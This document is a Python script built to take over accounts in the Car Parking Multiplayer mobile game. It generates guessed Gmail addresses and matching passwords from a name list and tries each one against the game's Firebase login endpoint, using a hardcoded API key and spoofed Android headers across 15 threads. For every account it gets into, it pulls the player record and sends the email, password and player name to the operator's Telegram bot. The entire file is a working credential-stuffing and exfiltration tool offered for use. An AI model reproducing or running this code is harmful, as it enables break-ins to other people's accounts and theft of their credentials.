import requests, json,datetime,time,os, random,threading,string,secrets
import webbrowser
webbrowser.open('https://t.me/ZZKGZ')
ID= input('your id : ')
token= input('your bot token :')
headers = {
    "Content-Type": "application/json",
    "X-Android-Package": "com.olzhas.carparking.multyplayer",
    "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
    "Accept-Language": "tr-TR, en-US",
    "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
    "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
    "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
    "Host": "www.googleapis.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip"
}
def login(email,password):
    data = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID"
    }
    res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
    #print(res)
    if "idToken" in res:
        tkn = res["idToken"]
        data2 = {
            "idToken": tkn
        }
        res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
        deta=res2['users'][0]['createdAt']
        data3 = {
            "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
        }
        he = {
            "authorization": f"Bearer {tkn}",
            "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.12.13"
        }
        info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text
        timestamp_str = deta
        timestamp = int(timestamp_str) / 1000
        date = datetime.datetime.fromtimestamp(timestamp)
        if "Name" in info:
         player_name=info.split(':')[2].split('"')[1]
        else:
         player_name=''
        success_message = f"حساب شغال:\nاليوزر: {email}\nالباسورد: {password}\nاسم اللاعب: {player_name}\nتاريخ الانشاء : {date}"
        print(success_message)
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= {success_message} ')
    else:
        failure_message = f"غير شغال : {email} | {password}"
        print(failure_message)
def com():
 while True:
  names = ''.join(random.choice(['Ada', 'Adriano', 'Afro', 'Agata', 'Alberto', 'Alessandra', 'Alessandro', 'Alessia', 'Alessio', 'Alfredo', 'Alice', 'Allegra', 'Alma', 'Amabel', 'Gabriel', 'Lucas', 'Matheus', 'Guilherme', 'Bruno', 'Rafael', 'Felipe', 'Thiago', 'Pedro', 'Carlos', 'rex', 'fred', 'jon', 'rosa', 'rimi', 'toni', 'niko', 'salah', 'jamal', 'lxml', 'James', 'Robert', 'John', 'Michael', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Anthony', 'Mark', 'Donald', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Kenneth', 'Kevin', 'Brian', 'George', 'Timothy', 'Ronald', 'Edward', 'Jason', 'Jeffrey', 'Ryan', 'Jacob', 'Gary', 'ahmed', 'naser', 'yousef', 'reda', 'mohamed', 'salah', 'user', 'tiktok', 'tik', 'ali', 'user', 'toker', 'ali', 'mohmaed', 'iran', 'iraq', 'boos', 'GINK', 'fast', 'ksmiran', 'eya', 'ahmed', 'mariem', 'firas', 'ghada', 'mohamed', 'rania', 'aziz', 'emna', 'mehdi', 'cyrine', 'sami', 'sarah', 'yassine', 'fatma', 'amine', 'salma', 'karim', 'malek', 'med', 'sarra', 'aymen', 'wafa', 'mohamed', 'yosr', 'ali', 'erij', 'ayoub', 'imen', 'adam', 'mel', 'khalil', 'ghofrane', 'khaled', 'khouloud', 'hamza', 'hiba', 'rayen', 'amani', 'sara', 'marwan', 'ines', 'omar', 'rihab', 'houssem', 'dhifef', 'ibrahim', 'esra', 'hani', 'maram', 'marouen', 'nesrine','alaa', 'syrine', 'hedy', 'user', 'user', 'tik', 'qwer', 'abood', 'jerry', 'roger', 'brian', 'dainel', 'patrick', 'floresjohn', 'ricardo', 'grace', 'nicholas', 'james', 'scottking', 'price', 'williams', 'steven', 'michael', 'dgray', 'ryan', 'john', 'jacob', 'charles', 'james', 'walker', 'jesus', 'hamada', 'yousif', 'ayman', 'ozgi', 'jakson', 'fares', 'faris', 'kamal', 'amjad', 'blail', 'bayan', 'fadil', 'younes','Joshua','abood','hashim','osman','zack','salim','salem','amar','saud','falah','khalif','gamer','hima','rima','assha','ozgi','yagiz','ryan','riyan','mkaml']) for m in range(1))
  numbers1 = ''.join(random.choices('1234567890',k=random.randint(1,3)))
  password = names+numbers1
  domains ='@gmail.com'
  email = f'{names}{numbers1}{domains}'
  login(email,password)
prox_list=[]
for i in range(15):
  t = threading.Thread(target=login and com)
  t.start()
  prox_list.append(t)
com()